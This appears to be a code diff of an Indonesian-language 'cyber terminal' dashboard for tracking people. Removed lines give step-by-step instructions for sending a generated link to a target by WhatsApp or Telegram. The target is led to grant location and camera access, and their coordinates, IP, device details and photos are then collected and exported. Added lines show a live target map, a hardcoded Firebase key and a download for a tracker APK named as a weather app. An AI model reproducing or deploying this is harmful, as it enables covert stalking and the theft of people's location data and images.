+    @keyframes cursorBlink {
+      0%, 49% { opacity: 1; }
+      50%, 100% { opacity: 0; }
+    }
+
+    /* TOP INFO BAR */
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 10px;
+      color: #7fff7f;
+      padding: 5px 0;
+      letter-spacing: 1px;
+    }
+    .top-bar .time {
+      color: #00ff41;
+      text-shadow: 0 0 5px #00ff41;
+      font-weight: bold;
+    }
+
+    .logout-btn {
       background: transparent;
       border: 1px solid #ff3366;
       color: #ff3366;
       font-family: 'Courier New', monospace;
-      font-size: 12px;
-      letter-spacing: 1px;
-      cursor: pointer;
-      text-shadow: 0 0 5px #ff3366;
-      border-radius: 3px;
-      transition: all 0.3s;
-      font-weight: bold;
-    }
-    .btn-close-chat:hover {
-      background: #ff3366;
-      color: #0a0e14;
-      box-shadow: 0 0 15px #ff3366;
-    }
-    .chat-messages {
-      flex: 1;
-      overflow-y: auto;
-      background: rgba(0,0,0,0.4);
-      border: 1px solid rgba(0,255,157,0.3);
-      border-radius: 5px;
-      padding: 12px;
-      margin-bottom: 12px;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-    .chat-messages::-webkit-scrollbar { width: 6px; }
-    .chat-messages::-webkit-scrollbar-track { background: rgba(0,255,157,0.05); }
-    .chat-messages::-webkit-scrollbar-thumb { background: #00ff9d; border-radius: 3px; }
-
-    .chat-msg {
-      padding: 8px 12px;
-      background: rgba(0,255,157,0.05);
-      border-left: 3px solid #00ff9d;
-      border-radius: 0 5px 5px 0;
-      font-size: 12px;
-      animation: chatMsgIn 0.3s ease-out;
-      position: relative;
-      word-wrap: break-word;
-    }
-    @keyframes chatMsgIn {
-      from { opacity: 0; transform: translateY(5px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .chat-msg.mine {
-      background: rgba(0,212,255,0.08);
-      border-left-color: #00d4ff;
-    }
-    .chat-msg-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 4px;
-      gap: 8px;
-    }
-    .chat-msg-user {
       font-size: 10px;
-      font-weight: bold;
-      letter-spacing: 1.5px;
-      text-shadow: 0 0 5px currentColor;
-    }
-    .chat-msg-time {
-      font-size: 9px;
-      color: #7dfcce;
-      letter-spacing: 0.5px;
-    }
-    .chat-msg-text {
-      font-size: 13px;
-      line-height: 1.5;
-      color: #e0fff0;
-      word-break: break-word;
-    }
-    .chat-msg.mine .chat-msg-text { color: #d0f0ff; }
-    .chat-msg-delete {
-      position: absolute;
-      top: 6px;
-      right: 8px;
-      background: transparent;
-      border: none;
-      color: #ff3366;
-      font-size: 12px;
+      padding: 4px 8px;
       cursor: pointer;
-      opacity: 0.5;
-      transition: opacity 0.3s;
-      padding: 2px 4px;
-    }
-    .chat-msg-delete:hover { opacity: 1; }
-
-    .chat-input-row {
-      display: flex;
-      gap: 6px;
-    }
-    .chat-input-row input {
-      flex: 1;
-      padding: 12px 14px;
-      font-size: 13px;
-    }
-    .chat-input-row button {
-      padding: 12px 18px;
-      background: #00ff9d;
-      color: #0a0e14;
-      border: none;
-      border-radius: 3px;
-      font-family: 'Courier New', monospace;
-      font-size: 12px;
-      font-weight: bold;
-      letter-spacing: 1.5px;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-    .chat-input-row button:hover { box-shadow: 0 0 15px #00ff9d; }
-    .chat-input-row button:disabled { opacity: 0.5; cursor: not-allowed; }
-
-    .chat-empty {
-      text-align: center;
-      color: rgba(0,255,157,0.5);
-      font-size: 11px;
       letter-spacing: 1px;
-      padding: 30px 10px;
+    }
+    .logout-btn:hover {
+      background: #ff3366;
+      color: #000;
     }
 
-    .leaflet-container { background: #000 !important; }
+    /* NOTIF */
+    .notif-btn {
+      background: transparent;
+      border: 1px solid #00ff41;
+      color: #00ff41;
+      font-family: 'Courier New', monospace;
+      font-size: 9px;
+      padding: 4px 8px;
+      cursor: pointer;
+      letter-spacing: 1px;
+    }
+    .notif-btn.active {
+      background: #00ff41;
+      color: #000;
+      box-shadow: 0 0 10px #00ff41;
+    }
   </style>
 </head>
 <body>
-  <div class="scanline"></div>
   <div class="wrap">
-    <div class="header">
-      <button class="btn-chat" id="btnChat" onclick="openChat()">
-        [ CHAT ]
-        <span class="chat-badge" id="chatBadge">0</span>
-      </button>
-      <div class="header-center" id="liveClock">--:--:--</div>
-      <button id="logout" onclick="logout()">LOGOUT</button>
-    </div>
 
-    <div class="box">
-      <div class="box-title">
-        » OPERATOR
-        <button class="notif-toggle" id="notifToggle" onclick="toggleNotif()">🔔 NOTIF: OFF</button>
+    <!-- TERMINAL HEADER -->
+    <div class="term-header">
+      <div class="dots">
+        <div class="dot red"></div>
+        <div class="dot yellow"></div>
+        <div class="dot green"></div>
       </div>
-      <div class="user-info">USER: <b id="u"></b></div>
-      <div class="status">CONNECTED</div>
+      <div class="title">CYBER TERMINAL</div>
+      <div style="width: 40px;"></div>
     </div>
 
-    <div class="box" id="panduanBox">
-      <div class="box-title">» PANDUAN OPERASI</div>
-      <div class="panduan-list">
-        <div class="panduan-row"><span class="pico">1️⃣</span><span class="ptxt">Masukkan nama target di kolom <b>GENERATE TRACKING LINK</b></span></div>
-        <div class="panduan-row"><span class="pico">2️⃣</span><span class="ptxt">Klik <b>GENERATE</b>, lalu klik <b>📋 SALIN LINK</b></span></div>
-        <div class="panduan-row"><span class="pico">3️⃣</span><span class="ptxt">Kirim link ke target via WhatsApp, Telegram, dll</span></div>
-        <div class="panduan-row"><span class="pico">4️⃣</span><span class="ptxt">Target buka link → <b>Allow</b> lokasi & kamera</span></div>
-        <div class="panduan-row"><span class="pico">5️⃣</span><span class="ptxt">Data masuk otomatis di panel <b>INCOMING DATA</b></span></div>
-      </div>
-      <button class="btn-close-panduan" onclick="document.getElementById('panduanBox').style.display='none'">
-        ✕ TUTUP PANDUAN
-      </button>
-    </div>
-
-    <div class="box">
-      <div class="box-title">» STATISTIK</div>
-      <div class="stats-grid">
-        <div class="stat-card">
-          <div class="stat-icon">📊</div>
-          <div class="stat-value" id="statTotal">0</div>
-          <div class="stat-label">Total Data</div>
+    <!-- TOP BAR -->
+    <div class="term-body" style="padding: 10px;">
+      <div class="top-bar">
+        <div>
+          USER: <span style="color: #00ffff;">rorax</span>
         </div>
-        <div class="stat-card">
-          <div class="stat-icon">📅</div>
-          <div class="stat-value" id="statToday">0</div>
-          <div class="stat-label">Hari Ini</div>
+        <div class="time" id="liveClock">--:--:--</div>
+        <button class="logout-btn" onclick="logout()">EXIT</button>
+      </div>
+      <div style="margin-top: 8px; display: flex; justify-content: space-between; align-items: center;">
+        <div style="font-size: 10px; color: #7fff7f;">
+          <span class="dot-status"></span>SYSTEM ONLINE
         </div>
-        <div class="stat-card">
-          <div class="stat-icon">🏆</div>
-          <div class="stat-value" id="statTop">-</div>
-          <div class="stat-label">Top Target</div>
+        <button class="notif-btn" id="notifToggle" onclick="toggleNotif()">🔔 NOTIF OFF</button>
+      </div>
+    </div>
+
+    <!-- ============================================
+         MONITOR LOKASI (ATAS)
+         ============================================ -->
+    <div class="term-body">
+      <div class="prompt">[MONITOR] LIVE TRACKING</div>
+
+      <!-- MAP -->
+      <div class="map-box" id="mapBox">
+        <div id="map"></div>
+        <div class="map-grid"></div>
+        <div class="map-crosshair"></div>
+        <div class="map-label">TARGET LOCKED</div>
+        <div class="map-coords" id="mapCoords">--, --</div>
+      </div>
+
+      <!-- INFO -->
+      <div class="term-info" id="infoPanel">
+        <div><span class="k">TARGET:</span><span class="v" id="infoUser">-</span></div>
+        <div><span class="k">LATITUDE:</span><span class="v" id="infoLat">-</span></div>
+        <div><span class="k">LONGITUDE:</span><span class="v" id="infoLng">-</span></div>
+        <div><span class="k">AKURASI:</span><span class="v" id="infoAkurasi">-</span></div>
+        <div><span class="k">DEVICE:</span><span class="v" id="infoDevice">-</span></div>
+        <div><span class="k">STATUS:</span><span class="v ok" id="infoStatus"><span class="dot-status"></span>ONLINE</span></div>
+        <div><span class="k">LAST UPDATE:</span><span class="v" id="infoTime">-</span></div>
+      </div>
+
+      <!-- ACTION BUTTONS -->
+      <button class="term-btn outline" onclick="bukaMaps()">[ BUKA GOOGLE MAPS ]</button>
+      <button class="term-btn outline" onclick="refreshData()">[ REFRESH DATA ]</button>
+
+      <!-- LOG -->
+      <div style="margin-top: 10px;">
+        <div style="font-size: 10px; color: #7fff7f; margin-bottom: 5px;">> SYSTEM LOG:</div>
+        <div id="logBox">
+          <div class="log-line">Initializing...</div>
         </div>
       </div>
     </div>
 
-    <div class="box">
-      <div class="box-title">» GENERATE TRACKING LINK</div>
-      <div class="label">TARGET NAME:</div>
-      <div class="input-row">
-        <input id="target" placeholder="masukkan nama target" autocomplete="off">
-        <button class="gen" onclick="genLink()">GENERATE</button>
+    <!-- ============================================
+         DOWNLOAD APK (BAWAH)
+         ============================================ -->
+    <div class="term-body apk-section">
+      <div class="prompt">[TOOLS] INSTALL TRACKER APK</div>
+
+      <div class="term-info">
+        <div><span class="k">FUNCTION:</span><span class="v">Lacak HP kamu sendiri</span></div>
+        <div><span class="k">INTERVAL:</span><span class="v">5 menit otomatis</span></div>
+        <div><span class="k">MODE:</span><span class="v">Background service</span></div>
+        <div><span class="k">TARGET:</span><span class="v">rorax</span></div>
       </div>
-      <div id="link">
-        <div class="link-box">
-          <div class="link-title">» TARGET LINK:</div>
-          <span class="link-url" id="linkUrl"></span>
-          <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 SALIN LINK</button>
+
+      <div style="border-top: 1px dashed #00ff41; margin: 10px 0; padding-top: 10px;">
+        <div style="font-size: 11px; color: #7fff7f; margin-bottom: 10px;">
+          > CARA INSTALL:
+        </div>
+        <div style="font-size: 11px; color: #00ff41; line-height: 1.8; margin-bottom: 10px;">
+          <div>$ step 1: download file</div>
+          <div>$ step 2: install apk</div>
+          <div>$ step 3: buka & input username "rorax"</div>
+          <div>$ step 4: tracking otomatis aktif</div>
         </div>
       </div>
-    </div>
 
-    <div class="box">
-      <div class="box-title">
-        » INCOMING DATA
-        <button class="btn-clear-all" onclick="clearAll()">🗑️ HAPUS SEMUA</button>
-      </div>
+      <a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration: none;">
+        <button class="term-btn">[ ▶ DOWNLOAD APK SEKARANG ]</button>
+      </a>
 
-      <div class="search-row">
-        <input id="searchInput" placeholder="🔍 Cari target..." oninput="filterData()">
-        <select id="filterDate" onchange="filterData()">
-          <option value="all">Semua</option>
-          <option value="today">Hari Ini</option>
-          <option value="7days">7 Hari</option>
-          <option value="30days">30 Hari</option>
-        </select>
-      </div>
-      <div class="search-info" id="searchInfo">Menampilkan <b id="countShown">0</b> dari <b id="countTotal">0</b> data</div>
-
-      <div id="hasil"><span class="empty">Waiting for data...</span></div>
-
-      <div class="export-row">
-        <button class="btn-export" onclick="exportCSV()">📥 EXPORT CSV</button>
-        <button class="btn-export" onclick="exportJSON()">📥 EXPORT JSON</button>
+      <div style="font-size: 9px; color: #7fff7f; text-align: center; margin-top: 8px;">
+        root@cyber:~# file: infocuaca.apk <span class="cursor"></span>
       </div>
     </div>
+
   </div>
 
-  <!-- ============================================
-       LIVE CHAT PANEL
-       ============================================ -->
-  <div class="chat-panel" id="chatPanel">
-    <div class="chat-container">
-      <div class="chat-header">
-        <h2>◉ LIVE CHAT GRUP</h2>
-        <button class="btn-close-chat" onclick="closeChat()">✕ TUTUP</button>
-      </div>
-      <div class="chat-messages" id="chatMessages">
-        <div class="chat-empty">Memuat chat...</div>
-      </div>
-      <div class="chat-input-row">
-        <input id="chatInput" placeholder="Ketik pesan..." autocomplete="off"
-               onkeypress="if(event.key==='Enter') sendChat()">
-        <button id="chatSendBtn" onclick="sendChat()">KIRIM</button>
-      </div>
-    </div>
-  </div>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-import { getDatabase, ref, onValue, remove, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+    const firebaseConfig = {
+      apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
+      authDomain: "roraxbali-65802.firebaseapp.com",
+      databaseURL: "https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
+      projectId: "roraxbali-65802",
+      storageBucket: "roraxbali-65802.firebasestorage.app",
+      messagingSenderId: "750633313866",
+      appId: "1:750633313866:web:3d2e552960e06db83968b3"
+    };
 
-const firebaseConfig = {
-  apiKey: "AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
-  authDomain: "roraxbali-65802.firebaseapp.com",
-  databaseURL: "https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "roraxbali-65802",
-  storageBucket: "roraxbali-65802.firebasestorage.app",
-  messagingSenderId: "750633313866",
-  appId: "1:750633313866:web:3d2e552960e06db83968b3"
-};
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
 
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
+    const user = localStorage.getItem('username');
+    if (!user) location.href = 'index.html';
 
-const user = localStorage.getItem('username');
-if (!user) location.href = 'index.html';
-document.getElementById('u').innerText = user;
+    // Update tampilan user
+    document.querySelector('.top-bar span').innerText = user;
+    document.querySelector('.apk-section .v').innerText = user;
 
-let allData = [];
+    // ============================================
+    // JAM LIVE
+    // ============================================
+    function updateClock() {
+      const now = new Date();
+      const h = String(now.getHours()).padStart(2,'0');
+      const m = String(now.getMinutes()).padStart(2,'0');
+      const s = String(now.getSeconds()).padStart(2,'0');
+      document.getElementById('liveClock').innerText = `${h}:${m}:${s}`;
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
 
-window.logout = () => {
-  localStorage.removeItem('username');
-  location.href = 'index.html';
-};
-
-// ===== WARNA PER USER =====
-function getUserColor(name) {
-  const colors = ['#00ff9d', '#00d4ff', '#ffcc00', '#ff3366', '#b366ff', '#ff8844', '#44ff88', '#ff66cc'];
-  let hash = 0;
-  for (let i = 0; i < name.length; i++) {
-    hash = name.charCodeAt(i) + ((hash << 5) - hash);
-  }
-  return colors[Math.abs(hash) % colors.length];
-}
-
-// ===== JAM DIGITAL LIVE =====
-function updateClock() {
-  const now = new Date();
-  const h = String(now.getHours()).padStart(2,'0');
-  const m = String(now.getMinutes()).padStart(2,'0');
-  const s = String(now.getSeconds()).padStart(2,'0');
-  document.getElementById('liveClock').innerText = `${h}:${m}:${s}`;
-}
-setInterval(updateClock, 1000);
-updateClock();
-
-// ===== NOTIFIKASI =====
-let notifEnabled = false;
-let lastDataCount = 0;
-let firstLoad = true;
-
-window.toggleNotif = () => {
-  notifEnabled = !notifEnabled;
-  const btn = document.getElementById('notifToggle');
-  if (notifEnabled) {
-    btn.innerText = '🔔 NOTIF: ON';
-    btn.classList.add('active');
-    playBeep(880, 0.1);
-    setTimeout(() => playBeep(1200, 0.1), 120);
-  } else {
-    btn.innerText = '🔔 NOTIF: OFF';
-    btn.classList.remove('active');
-  }
-};
-
-function playBeep(freq = 880, duration = 0.15) {
-  if (!notifEnabled) return;
-  try {
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const osc = ctx.createOscillator();
-    const gain = ctx.createGain();
-    osc.type = 'square';
-    osc.frequency.value = freq;
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    gain.gain.setValueAtTime(0.15, ctx.currentTime);
-    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
-    osc.start();
-    osc.stop(ctx.currentTime + duration);
-  } catch(e) {}
-}
-
-function playAlertSound() {
-  if (!notifEnabled) return;
-  playBeep(600, 0.12);
-  setTimeout(() => playBeep(880, 0.12), 150);
-  setTimeout(() => playBeep(1200, 0.2), 300);
-  if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 200]);
-}
-
-let currentLink = '';
-
-window.genLink = () => {
-  const target = document.getElementById('target').value.trim() || 'target';
-  const url = `${location.origin}/track.html?u=${encodeURIComponent(user)}&t=${encodeURIComponent(target)}`;
-  currentLink = url;
-  document.getElementById('linkUrl').innerText = url;
-  document.getElementById('link').style.display = 'block';
-  document.getElementById('btnCopy').innerText = '📋 SALIN LINK';
-  document.getElementById('btnCopy').classList.remove('copied');
-};
-
-window.copyLink = async () => {
-  if (!currentLink) return;
-  const btn = document.getElementById('btnCopy');
-  try {
-    await navigator.clipboard.writeText(currentLink);
-  } catch(e) {
-    const ta = document.createElement('textarea');
-    ta.value = currentLink;
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand('copy');
-    document.body.removeChild(ta);
-  }
-  btn.innerText = '✓ TERSALIN!';
-  btn.classList.add('copied');
-  setTimeout(() => {
-    btn.innerText = '📋 SALIN LINK';
-    btn.classList.remove('copied');
-  }, 2000);
-};
-
-window.clearAll = async () => {
-  if (!confirm('Yakin hapus SEMUA data? Tidak bisa dikembalikan.')) return;
-  try {
-    await remove(ref(db, 'lokasi/' + user));
-    allData = [];
-    lastDataCount = 0;
-    alert('✓ Semua data dihapus');
-  } catch(e) {
-    alert('Gagal hapus: ' + e.message);
-  }
-};
-
-window.deleteItem = async (key) => {
-  if (!confirm('Hapus data ini?')) return;
-  try {
-    await remove(ref(db, 'lokasi/' + user + '/' + key));
-  } catch(e) {
-    alert('Gagal hapus: ' + e.message);
-  }
-};
-
-window.downloadCard = async (key) => {
-  const card = document.getElementById('card-' + key);
-  if (!card) return;
-
-  const btn = card.querySelector('.btn-download');
-  const originalText = btn.innerText;
-  btn.innerText = '⏳ PROSES...';
-  btn.disabled = true;
-
-  try {
-    const canvas = await html2canvas(card, {
-      backgroundColor: '#0a0e14',
-      scale: 2,
-      useCORS: true,
-      allowTaint: true,
-      ignoreElements: (el) => el.classList && (
-        el.classList.contains('leaflet-container') || 
-        el.classList.contains('radar-overlay')
-      )
-    });
-
-    const link = document.createElement('a');
-    const nama = card.querySelector('.card-name-value').innerText.replace(/[^a-z0-9]/gi, '_');
-    link.download = `target_${nama}_${Date.now()}.png`;
-    link.href = canvas.toDataURL('image/png');
-    link.click();
-
-    btn.innerText = '✓ TERSIMPAN!';
-    setTimeout(() => {
-      btn.innerText = originalText;
-      btn.disabled = false;
-    }, 2000);
-  } catch(e) {
-    alert('Gagal download: ' + e.message);
-    btn.innerText = originalText;
-    btn.disabled = false;
-  }
-};
-
-function batteryBar(level) {
-  if (!level) return '';
-  const num = parseInt(level);
-  let cls = '';
-  if (num <= 20) cls = 'low';
-  else if (num <= 50) cls = 'mid';
-  return `<span class="battery-bar"><span class="battery-fill ${cls}" style="width:${num}%"></span></span>`;
-}
-
-function generateID(waktu) {
-  const t = new Date(waktu);
-  const y = t.getFullYear().toString().slice(-2);
-  const m = String(t.getMonth()+1).padStart(2,'0');
-  const d = String(t.getDate()).padStart(2,'0');
-  const h = String(t.getHours()).padStart(2,'0');
-  const mn = String(t.getMinutes()).padStart(2,'0');
-  const s = String(t.getSeconds()).padStart(2,'0');
-  return `TGT-${y}${m}${d}-${h}${mn}${s}`;
-}
-
-// ===== SEARCH & FILTER =====
-window.filterData = () => {
-  renderData();
-};
-
-function getFilteredData() {
-  const search = (document.getElementById('searchInput')?.value || '').toLowerCase().trim();
-  const dateFilter = document.getElementById('filterDate')?.value || 'all';
-
-  const now = new Date();
-  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
-
-  return allData.filter(([key, d]) => {
-    if (search) {
-      const targetName = (d.target || '').toLowerCase();
-      const kota = (d.kota || '').toLowerCase();
-      const ip = (d.ip || '').toLowerCase();
-      if (!targetName.includes(search) && !kota.includes(search) && !ip.includes(search)) {
-        return false;
+    // ============================================
+    // LOG SYSTEM
+    // ============================================
+    function addLog(msg, type = '') {
+      const logBox = document.getElementById('logBox');
+      const line = document.createElement('div');
+      line.className = 'log-line ' + type;
+      const time = new Date().toLocaleTimeString('id-ID');
+      line.innerText = `[${time}] ${msg}`;
+      logBox.appendChild(line);
+      // Batasi 10 log terakhir
+      while (logBox.children.length > 10) {
+        logBox.removeChild(logBox.firstChild);
       }
     }
 
-    if (dateFilter === 'today') {
-      if (d.waktu < todayStart) return false;
-    } else if (dateFilter === '7days') {
-      if (d.waktu < todayStart - 7 * 24 * 60 * 60 * 1000) return false;
-    } else if (dateFilter === '30days') {
-      if (d.waktu < todayStart - 30 * 24 * 60 * 60 * 1000) return false;
+    window.refreshData = () => {
+      addLog('Manual refresh requested', 'warn');
+      addLog('Fetching latest data...');
+    };
+
+    // ============================================
+    // NOTIF TOGGLE
+    // ============================================
+    let notifEnabled = false;
+    window.toggleNotif = () => {
+      notifEnabled = !notifEnabled;
+      const btn = document.getElementById('notifToggle');
+      if (notifEnabled) {
+        btn.classList.add('active');
+        btn.innerText = '🔔 NOTIF ON';
+        beep(880, 0.1);
+        setTimeout(() => beep(1200, 0.1), 120);
+      } else {
+        btn.classList.remove('active');
+        btn.innerText = '🔔 NOTIF OFF';
+      }
+    };
+
+    function beep(freq, dur) {
+      if (!notifEnabled) return;
+      try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'square';
+        osc.frequency.value = freq;
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        gain.gain.setValueAtTime(0.1, ctx.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur);
+        osc.start();
+        osc.stop(ctx.currentTime + dur);
+      } catch(e) {}
     }
 
-    return true;
-  });
-}
+    // ============================================
+    // LOGOUT
+    // ============================================
+    window.logout = () => {
+      localStorage.removeItem('username');
+      location.href = 'index.html';
+    };
 
-// ===== STATISTIK =====
-function updateStats() {
-  const total = allData.length;
-  const now = new Date();
-  const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
-  const today = allData.filter(([k,d]) => d.waktu >= todayStart).length;
+    // ============================================
+    // MAP SETUP
+    // ============================================
+    let map = null;
+    let marker = null;
 
-  const counter = {};
-  allData.forEach(([k,d]) => {
-    const t = d.target || 'Unknown';
-    counter[t] = (counter[t] || 0) + 1;
-  });
-  let topTarget = '-';
-  let topCount = 0;
-  for (const [name, count] of Object.entries(counter)) {
-    if (count > topCount) {
-      topCount = count;
-      topTarget = name;
+    function initMap() {
+      map = L.map('map', {
+        zoomControl: false,
+        attributionControl: false,
+        dragging: true,
+        scrollWheelZoom: true
+      }).setView([-4.5454, 138.4947], 15);
+
+      L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+        maxZoom: 18
+      }).addTo(map);
+
+      addLog('Satellite map initialized');
     }
-  }
+    initMap();
 
-  document.getElementById('statTotal').innerText = total;
-  document.getElementById('statToday').innerText = today;
-  document.getElementById('statTop').innerText = topTarget !== '-' ? topTarget.substring(0, 8) : '-';
-}
+    // ============================================
+    // BACA DATA LOKASI DARI FIREBASE
+    // ============================================
+    let lastDataCount = 0;
 
-// ===== EXPORT =====
-window.exportCSV = () => {
-  if (allData.length === 0) {
-    alert('Tidak ada data untuk di-export');
-    return;
-  }
+    onValue(ref(db, 'lokasi/' + user), snap => {
+      const data = snap.val();
 
-  const headers = ['ID', 'Target', 'Waktu', 'Kota', 'Lat', 'Lng', 'IP', 'Suhu', 'Baterai', 'Platform', 'Jaringan', 'Timezone', 'Akurasi', 'Sumber'];
-  const rows = allData.map(([key, d]) => [
-    generateID(d.waktu),
-    d.target || '',
-    new Date(d.waktu).toLocaleString('id-ID'),
-    d.kota || '',
-    d.lat || '',
-    d.lng || '',
-    d.ip || '',
-    d.suhu || '',
-    d.baterai || '',
-    d.platform || '',
-    d.network || '',
-    d.timezone || '',
-    d.akurasi || '',
-    d.sumber || ''
-  ]);
+      if (!data) {
+        addLog('Waiting for APK data...', 'warn');
+        document.getElementById('infoUser').innerText = user;
+        document.getElementById('infoStatus').innerHTML = '<span class="dot-status" style="background:#ffcc00;box-shadow:0 0 8px #ffcc00"></span>WAITING';
+        return;
+      }
 
-  const csv = [
-    headers.join(','),
-    ...rows.map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(','))
-  ].join('\n');
+      // Ambil data terbaru
+      const entries = Object.entries(data).sort((a,b) => b[1].waktu - a[1].waktu);
+      const latest = entries[0][1];
 
-  const blob = new Blob(['\ufeff' + csv], { type: 'text/csv;charset=utf-8;' });
-  const link = document.createElement('a');
-  link.download = `cyber_data_${Date.now()}.csv`;
-  link.href = URL.createObjectURL(blob);
-  link.click();
-  URL.revokeObjectURL(link.href);
-};
+      // Update info
+      document.getElementById('infoUser').innerText = latest.user || user;
+      document.getElementById('infoLat').innerText = latest.lat ? latest.lat.toFixed(6) : '-';
+      document.getElementById('infoLng').innerText = latest.lng ? latest.lng.toFixed(6) : '-';
+      document.getElementById('infoAkurasi').innerText = latest.akurasi ? latest.akurasi.toFixed(2) + ' m' : '-';
+      document.getElementById('infoDevice').innerText = latest.device || '-';
+      document.getElementById('infoStatus').innerHTML = '<span class="dot-status"></span>ONLINE';
+      document.getElementById('infoTime').innerText = new Date(latest.waktu).toLocaleString('id-ID');
 
-window.exportJSON = () => {
-  if (allData.length === 0) {
-    alert('Tidak ada data untuk di-export');
-    return;
-  }
+      // Update coords di map
+      if (latest.lat && latest.lng) {
+        document.getElementById('mapCoords').innerText = latest.lat.toFixed(4) + ', ' + latest.lng.toFixed(4);
 
-  const dataExport = allData.map(([key, d]) => {
-    const copy = { ...d };
-    if (copy.foto) copy.foto = '[FOTO_BASE64_DIHAPUS]';
-    return copy;
-  });
+        // Update marker
+        if (marker) {
+          marker.setLatLng([latest.lat, latest.lng]);
+        } else {
+          marker = L.marker([latest.lat, latest.lng]).addTo(map);
+          marker.bindPopup(
+            '<div style="font-family: monospace; color: #00ff41; font-size: 10px; text-align: center;">' +
+            '<b>◉ ' + (latest.user || user).toUpperCase() + '</b><br>' +
+            latest.lat.toFixed(5) + ', ' + latest.lng.toFixed(5) +
+            '</div>',
+            { className: 'target-popup', closeButton: false }
+          ).openPopup();
+        }
 
-  const json = JSON.stringify({
-    user: user,
-    exported: new Date().toLocaleString('id-ID'),
-    total: dataExport.length,
-    data: dataExport
-  }, null, 2);
+        // Pan map ke lokasi
+        map.setView([latest.lat, latest.lng], map.getZoom());
+      }
 
-  const blob = new Blob([json], { type: 'application/json;charset=utf-8;' });
-  const link = document.createElement('a');
-  link.download = `cyber_data_${Date.now()}.json`;
-  link.href = URL.createObjectURL(blob);
-  link.click();
-  URL.revokeObjectURL(link.href);
-};
+      // Log data baru
+      if (entries.length > lastDataCount) {
+        if (lastDataCount > 0) {
+          addLog('Data baru diterima!');
+          beep(900, 0.08);
+        }
+        lastDataCount = entries.length;
+      }
 
-// ===== MAP =====
-let currentMap = null;
-let currentMarker = null;
-
-function renderData() {
-  const filtered = getFilteredData();
-  const container = document.getElementById('hasil');
-
-  document.getElementById('countShown').innerText = filtered.length;
-  document.getElementById('countTotal').innerText = allData.length;
-
-  if (filtered.length === 0) {
-    container.innerHTML = '<span class="empty">Tidak ada data yang cocok</span>';
-    if (currentMap) { try { currentMap.remove(); } catch(e){} currentMap = null; }
-    return;
-  }
-
-  container.innerHTML = filtered.map(([key, d], index) => `
-    <div class="card-target" id="card-${key}">
-      <div class="card-top">
-        <span>ID: <span class="id-code">${generateID(d.waktu)}</span></span>
-        <span>${new Date(d.waktu).toLocaleString('id-ID')}</span>
-      </div>
-
-      ${d.lat && index === 0 ? `
-        <div class="map-box" id="map-${key}">
-          <div id="map"></div>
-          <div class="map-overlay"></div>
-          <div class="map-scanline"></div>
-          <div class="map-crosshair"></div>
-          <div class="radar-overlay">
-            <div class="radar-ring r1"></div>
-            <div class="radar-ring r2"></div>
-            <div class="radar-ring r3"></div>
-            <div class="radar-sweep"></div>
-            <div class="radar-ping"></div>
-            <div class="radar-ping p2"></div>
-            <div class="radar-center"></div>
-          </div>
-          <div class="map-status">SCANNING TARGET</div>
-          <div class="map-coords" id="coords-${key}">${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</div>
-          <div class="map-zoom" id="zoom-${key}">ZOOM: 2</div>
-        </div>
-      ` : ''}
-
-      ${d.foto ? `
-        <div class="card-photo-wrap">
-          <img class="card-photo" src="${d.foto}" alt="target" crossorigin="anonymous">
-          <div class="card-photo-tag">◉ LIVE CAPTURE</div>
-          <div class="card-photo-badge">● REC</div>
-        </div>
-      ` : ''}
-
-      <div class="card-name-block">
-        <div class="card-name-label">TARGET NAME</div>
-        <div class="card-name-value">${d.target || 'UNKNOWN'}</div>
-      </div>
-
-      <div class="card-data">
-        ${d.lat ? `
-          <div class="card-row"><span class="cico">📍</span><span class="clbl">Lokasi</span><span class="cval">${d.kota || ''} ${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</span></div>
-          <div class="card-row"><span class="cico">🗺️</span><span class="clbl">Maps</span><span class="cval"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">BUKA GOOGLE MAPS →</a></span></div>
-        ` : ''}
-        ${d.ip ? `<div class="card-row"><span class="cico">🌐</span><span class="clbl">IP</span><span class="cval">${d.ip}</span></div>` : ''}
-        ${d.suhu !== undefined ? `<div class="card-row"><span class="cico">🌡️</span><span class="clbl">Suhu</span><span class="cval">${Math.round(d.suhu)}°C</span></div>` : ''}
